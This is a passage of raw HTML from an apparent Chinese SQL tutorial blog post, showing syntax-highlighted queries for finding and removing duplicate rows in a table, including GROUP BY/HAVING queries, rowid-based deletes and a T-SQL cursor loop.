#000000\">&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId&nbsp;)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">3</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录（多个字段）&nbsp;<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">4</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、删除表中多余的重复记录（多个字段），只留有rowid最小的记录<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">5</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录（多个字段），不包含rowid最小的记录<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(二)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">比方说<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">在A表中存在一个字段“name”，<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">而且不同记录之间的“name”值有可能会相同，<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">现在就是需要查询出在该表中的各记录之间，“name”值存在重复的项；<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">Select</span><span style=\"color: #000000\">&nbsp;Name,</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">From</span><span style=\"color: #000000\">&nbsp;A&nbsp;</span><span style=\"color: #0000ff\">Group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">By</span><span style=\"color: #000000\">&nbsp;Name&nbsp;</span><span style=\"color: #0000ff\">Having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">如果还查性别也相同大则如下:<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">Select</span><span style=\"color: #000000\">&nbsp;Name,sex,</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">From</span><span style=\"color: #000000\">&nbsp;A&nbsp;</span><span style=\"color: #0000ff\">Group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">By</span><span style=\"color: #000000\">&nbsp;Name,sex&nbsp;</span><span style=\"color: #0000ff\">Having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(三)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">方法一<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">declare</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #000000\">integer</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #000000\">integer</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">declare</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">cursor</span><span style=\"color: #000000\">&nbsp;local&nbsp;</span><span style=\"color: #0000ff\">for</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;主字段,</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;表名&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;主字段&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">；&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">open</font></span><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;cur_rows<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">fetch</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">while</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #008000\">@@fetch_status</span><span style=\"color: #808080\">=</span><span style=\"font-weight: bold; color: #800000\">0</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">begin</font></span><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">=</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">-</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">set</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">rowcount</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;表名&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;主字段&nbsp;</span><span style=\"color: #808080\">=</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">fetch</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">end</font></span><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">close</font></span><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;cur_rows<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">set</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">rowcount</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">0</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">方法二<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">　　有两个意义上的重复记录，一是完全重复的记录，也即所有字段均重复的记录，二是部分关键字段重复的记录，比如Name字段重复，而其他字段不一定重复或都重复可以忽略。<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"font-weight: bold; color: #800000\"><font face=\"Courier New\">1</font></span><font face=\"Courier New\"><span style=\"color: #000000\">、对于第一种重复，比较容易解决，使用<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">distinct</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">就可以得到无重复记录的结果集。<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">如果该表需要删除重复的记录（重复记录保留1条），可以按以下方法删除<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">distinct</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">drop</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: 